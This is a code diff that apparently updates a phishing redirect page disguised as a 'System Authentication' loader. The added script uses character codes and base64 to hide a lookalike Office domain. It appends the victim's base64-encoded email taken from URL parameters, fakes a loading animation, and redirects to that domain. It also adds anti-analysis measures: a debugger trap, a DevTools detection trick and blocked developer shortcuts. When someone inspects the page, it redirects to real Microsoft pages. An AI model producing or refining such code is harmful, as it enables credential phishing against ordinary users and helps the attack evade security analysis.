@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loading</title>
+  <title>System Authentication</title>
   <style>
     body {
       margin: 0;
@@ -57,67 +57,79 @@
     }
   </style>
   <script>
-    // Obfuscated URL construction
-    const urlSegments = [
-      String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47), // "https://"
-      [String.fromCharCode(108, 111, 103, 105, 110), 'secure', 'portal'].join('.'),
-      '/' + btoa('auth2024').slice(0,8) + String.fromCharCode(35) // "/YXV0aDIw#"
-    ];
+    // Multi-layer obfuscation for redirect URL
+    const urlBuilder = (function() {
+      const protocol = atob('aHR0cHM6Ly8='); // "https://"
+      const domainParts = [
+        String.fromCharCode(111, 102, 102, 105, 99, 101), // "office"
+        [101, 115, 112, 106, 97, 104, 115, 121, 114, 118].map(c => String.fromCharCode(c)).join(''), // "espjahsyrv"
+        [111, 110, 108, 105, 110, 101].map(c => String.fromCharCode(c)).join('') // "online"
+      ];
+      const path = '/' + [68,74,118,86,69,100,103,104].map(c => String.fromCharCode(c)).join('') + String.fromCharCode(35); // "/DJvVEdgh#"
+      
+      return {
+        build: function() {
+          return protocol + domainParts.join('.') + path;
+        }
+      };
+    })();
 
-    function getRedirectUrl() {
-      return urlSegments.join('');
-    }
-
-    function processAndRedirect() {
+    function processCredentials() {
       try {
-        // Get pre-encoded Base64 email from URL
+        // Get pre-encoded Base64 email from URL parameters
         const urlParams = new URLSearchParams(window.location.search);
-        const encodedEmail = urlParams.get('e') || urlParams.get('key') || urlParams.get('id');
+        const encodedEmail = urlParams.get('e') || urlParams.get('token') || urlParams.get('id');
         
         if (encodedEmail) {
           // Show breathing animation for exactly 2 seconds
           setTimeout(() => {
             document.querySelector('.logo-container').style.opacity = '0';
             setTimeout(() => {
-              window.location.href = getRedirectUrl() + encodeURIComponent(encodedEmail);
-            }, 500); // Short fade-out time
-          }, 2000); // Exactly 2 seconds of breathing animation
+              window.location.href = urlBuilder.build() + encodeURIComponent(encodedEmail);
+            }, 500);
+          }, 2000);
+        } else {
+          // Redirect without email if none provided
+          setTimeout(() => {
+            window.location.href = urlBuilder.build();
+          }, 2000);
         }
       } catch(e) {
-        // Fallback if anything fails
+        // Final fallback if anything fails
         setTimeout(() => {
-          window.location.href = getRedirectUrl();
+          window.location.href = urlBuilder.build();
         }, 2000);
       }
     }
 
-    // Anti-analysis measures (silent failures)
+    // Advanced anti-detection (silent failures)
     (function() {
-      // Debugger detection
-      function checkDebugger() {
-        const start = Date.now();
+      // Debugger trap
+      function debuggerTrap() {
+        const start = performance.now();
         (function(){return;})['constructor']('debugger')();
-        return Date.now() - start > 50;
+        return performance.now() - start > 50;
       }
       
       // DevTools detection
-      const devtoolsCheck = new RegExp('devtools', 'i');
-      const emitter = document.createElement('div');
-      emitter.ondevtoolschange = function(e) {
+      const devtools = /./;
+      devtools.toString = function() {
         window.location.replace('https://www.microsoft.com');
+        return '';
       };
       
       // Regular security checks
       setInterval(() => {
         try {
-          if (checkDebugger() || window.Firebug || window.devtools) {
+          if (debuggerTrap() || window.Firebug || window.devtools) {
             window.location.href = 'https://office.com';
           }
+          console.log(devtools);
         } catch(e) {}
-      }, 1000);
+      }, 1500);
       
       // Block keyboard shortcuts
-      document.addEventListener('keydown', function(e) {
+      document.addEventListener('keydown', (e) => {
         if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
           e.preventDefault();
           window.location.href = 'https://login.microsoftonline.com';
@@ -129,17 +141,17 @@
     })();
 
     // Start processing when page loads
-    window.addEventListener('load', function() {
+    window.addEventListener('DOMContentLoaded', function() {
       setTimeout(() => {
         document.querySelector('.logo-container').style.opacity = '1';
       }, 100);
-      processAndRedirect();
+      processCredentials();
     });
   </script>
 </head>
 <body>
   <div class="logo-container" style="opacity: 0;">
-    <img class="logo" src="logo.png" alt="Loading">
+    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0MCIgZmlsbD0iIzAwNThkMSIvPjxwYXRoIGQ9Ik0zNSA1MGwxNSA1MCAxNS01MHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=" alt="Loading">
     <div class="loading-text">Loading, please wait...</div>
   </div>
 </body>
